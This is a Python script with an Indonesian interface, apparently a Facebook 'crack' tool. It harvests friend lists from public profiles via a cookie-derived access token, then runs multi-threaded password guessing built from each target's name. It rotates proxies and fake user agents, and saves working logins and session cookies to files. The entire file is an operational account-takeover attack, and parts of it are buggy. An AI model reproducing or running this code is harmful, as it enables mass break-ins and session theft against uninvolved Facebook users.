import os, re, json, sys, random, time, requests
from concurrent.futures import ThreadPoolExecutor as Ganteng
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from datetime import datetime
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

method,tokene=[],[]
id,id2,uid=[],[],[]
loop,ok,cp=0,0,0
dump,ugen=[],[]

m = '\x1b[1;91m' # MERAH
k = '\x1b[1;93m' # KUJING
h = '\x1b[1;92m' # HIJAU
u = '\x1b[1;95m' # UNGU
b = '\x1b[1;94m' # BIRU
dx = '\33[m' # DEFAULT

sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
okc = f'OK-{hari}-{bulan}-{tahun}.txt'
cpc = f'CP-{hari}-{bulan}-{tahun}.txt'

for xr in range(10000):
    rr=random.randint
    xv=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    xy=random.randrange(400,700)
    realme = random.choice(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
    xd=f"Mozilla/5.0 (Linux; Android {str(rr(0,20))}; {realme}) Build/0{str(rr(1,9))}0{str(rr(1,20))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,99))}.0.{str(rr(4000,9000))}.{str(rr(72,140))} Mobile Safari/537.36"
    xd=f"Mozilla/5.0 (Linux; Android {str(rr(0,20))}; X{xy}{xv}) Build/0{str(rr(1,9))}0{str(rr(1,20))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,99))}.0.{str(rr(4000,9000))}.{str(rr(72,140))} Mobile Safari/537.36"
    ugen.append(xd)
    
def banner():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f'''\t{u}
┏┓┳┳┳┓┏┓┏┓┓   ┳┳┓
┗┓┃┃┃┃┃┃┣ ┃ ━━┃┃┃
┗┛┻┛ ┗┣┛┗┛┗┛  ┻┻┛
   {k}CYXIEON-XD{dx}''')
        
def login():
	try:
		banner()
		cok = input(f'\n{dx}> Cokies {h}: ')
		cos = {'cookie':cok}
		data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
		ses = requests.Session()
		req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
		cd   = req['code']
		ucd  = req['user_code']
		url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd)
		req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser')
		raq  = req.find('form',{'method':'post'})
		dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}
		rel  = 'https://mbasic.facebook.com' + raq['action']
		pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat  = {}
		raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']
		pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		req = ses.get(url,cookies=cos).json()
		tok = req['access_token']
		kot = open('.token.txt','w').write(tok)
		koc = open('.cok.txt','w').write(cok)
		print(f'{dx}> Token {h}: {tok}{dx}')
		suk = input('[>] tekan enter')
		menu()
	except Exception as e:
		print(e)
    	
def menu():
        try:
            token = open('.token.txt','r').read()
            cok = open('.cok.txt','r').read()
            tokene.append(token)
            try:
                cxy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokene[0], cookies={'cookie':cok})
                id = json.loads(cxy.text)['id']
                name = json.loads(cxy.text)['name']
            except KeyError:
                print(f"{m}> Cokies Anda Kedaluarsa{dx}")
                time.sleep(3);login()
        except IOError:
            print(f"{m}> Cokies Anda Kedaluarsa{dx}")
            time.sleep(3);login()
        except requests.exceptions.ConnectionError:
            exit(f"{m}> Koneksi Problem{dx}")       
        banner()   
        print()         
        print(f'{dx}[>] User  Id {h}: {name}{dx}')
        print(f'{dx}[>] Username {h}: {id}{dx}')
        print()
        print(f'[01] Crack publik ')
        print(f'[00] Logout ')
        print()
        xmn = input(f'{dx}> Choose : ')
        if xmn in ['01','1']:
            publik(cok,token)
        elif xmn in ['00','0']:
            os.system('rm -rf .cok.txt && rm -rf .token.txt')   
            exit(f'{m}> Sukses hapus cokies')    
        else:pass
		
def publik(cok,token):    
	try:
		print()
		pul = int(input(f'{dx}[>] Berapa {h}: '))
	except ValueError:
	    exit(f'{m}> Gagal dump{dx}')
	if pul<1 or pul>1000:
	    exit(f'{m}> Limit 1000{dx}')
	print()
	bil = 0
	for koh in range(pul):
		bil+=1
		suk = input(f'{dx}> ID '+str(bil)+f' {h}: ')
		uid.append(suk)
	for user in uid:
	    try:
	       params = ({'access_token': token,'fields': "friends"})
	       bas = requests.get('https://graph.facebook.com/{}'.format(user),params=params,cookies={'cookies':cok}).json()
	       for x in bas['friends']['data']:
	           try:
	               z = (x['id']+'|'+x['name'])
	               if z in id:
	                   pass
	               else:
	                   id.append(z)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        prints(Panel.fit(f'Koneksi problem',style=f'red'))
	        exit()
	try:
	      print()
	      print(f"{dx}[>] Total ID : {h}"+str(len(id)))
	      setting()
	except requests.exceptions.ConnectionError:
	    exit(f'{m}> Gagal dump{dx}')
	except (KeyError,IOError):
		exit(f'{m}> Akun tidak publik{dx}')
		
def setting():
     rr = random.randint
     for ran in id:
            c_id = rr(0,len(id2))
            id2.insert(c_id, ran)
     setting2()
     
def setting2():
         print()
         med = input(f'{dx}> Ketik Ganteng : ')
         if med in ['ganteng']:
             method.append('crack')  
         else:method.append('crack')  
         otomatis()
     
def otomatis():
	global prog,des
	print()
	print(f'{dx}[>] OK Simpan/{h}{okc}{dx}')
	print(f'{dx}[>] CP Simpan/{k}{cpc}{dx}')
	print()
	print(f'{u}> Mainkan Mode Pesawat{dx}')
	print()
	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with Ganteng(max_workers=30) as via:
			for van in id2:
				idf = van.split('|')[0]
				nmf = van.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwx = [
				nmf,
				frs+'12',
				frs+'123',
				frs+'1234',
				frs+'12345',
				frs+'01',
				frs+'02',
				frs+'03',
				frs+'04',
				frs+'05'
			]
				if 'crack' in method:
				    via.submit(crackv,idf,pwx)
				else:pass
	print()
	exit(f"{dx}[>] Crack telah selesai dengan jumlah {h}OK : {ok}{dx} dan jumlah {k}CP : {cp}{dx}")
	
def crackv(idf,pwx):
	global loop,ok,cp
	prog.update(des,description=f'{dx}( Crack ) ({h} OK : {ok} {dx}) ({k} CP : {cp} {dx}) ({m} {loop} {dx})')
	prog.advance(des)
	for pw in pwx:
		try:
			ses = requests.Session()
			proxs = ses.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = random.choice(proxs)
			proxs = {'http': 'socks5://'+nip}
			ua = random.choice(ugen)	
			link= ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D288796421158889%26redirect_uri%3Dhttps%253A%252F%252Fwww.codeproject.com%252Fscript%252FMembership%252FOAuthLogOn.aspx%26scope%3Demail%26state%3D7279420%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc13fcb87-180e-41f7-9528-6a5ded60aaab%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codeproject.com%2Fscript%2FMembership%2FOAuthLogOn.aspx%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7279420%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v6.0/dialog/oauth?response_type=code&client_id=288796421158889&redirect_uri=https%3A%2F%2Fwww.codeproject.com%2Fscript%2FMembership%2FOAuthLogOn.aspx&scope=email&state=7279420&ret=login&fbapp_pres=0&logger_id=c13fcb87-180e-41f7-9528-6a5ded60aaab&tp=unspecified","flow":"login_no_pin","pass":pw,}
			cokz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			cokz+=' m_pixel_ratio=2.625; wd=412x756'
			head={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not)A;Brand";v="14", "Chromium";v="114"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.7,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D288796421158889%26redirect_uri%3Dhttps%253A%252F%252Fwww.codeproject.com%252Fscript%252FMembership%252FOAuthLogOn.aspx%26scope%3Demail%26state%3D7279420%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc13fcb87-180e-41f7-9528-6a5ded60aaab%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codeproject.com%2Fscript%2FMembership%2FOAuthLogOn.aspx%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7279420%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies={'cookie': cokz},headers=head,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				head = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
				coz = po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'\n')
				print(f'{dx}> ID : {h}{idf}{dx}')
				print(f'{dx}> Sandi : {h}{pw}{dx}')
				print(f'{dx}> Cookies : {h}{coki}{dx}')
				akf = ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",headers=head,cookies={'cookie':coki}).text
				soup = par(akf, "html.parser")
				print(f'{h}[>] Aplikasi Aktif{dx}')
				for ak in soup.find_all("h3"):
				    if "Ditambahkan" in ak.text:
				        print(f"{dx}> {str(ak.text).replace(f'Ditambahkan',f' {h}Ditambahkan')}{dx}")
				kdl = ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",headers=head,cookies={'cookie':coki}).text
				siu = par(kdl, "html.parser")
				print(f'{k}[>] Aplikasi Expired{dx}')
				for kl in siu.find_all("h3"):
				    if "Kedaluwarsa" in kl.text:
				        print(f"{dx}> {str(kl.text).replace('Kedaluwarsa',f' {k}Kedaluwarsa')}{dx}")
				hps = ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",headers=head,cookies={'cookie':coki}).text
				html = par(hps, "html.parser")
				print(f'{m}[>] Aplikasi Deleted{dx}')
				for exp in html.find_all("h3"):
				    if "Dihapus" in exp.text:
				        print(f"{dx}> {str(exp.text).replace('Dihapus',f' {m}Dihapus')}{dx}")
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'{dx}> ID : {k}{idf}{dx}')
				print(f'{dx}> Sandi : {k}{pw}{dx}')
				open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	menu()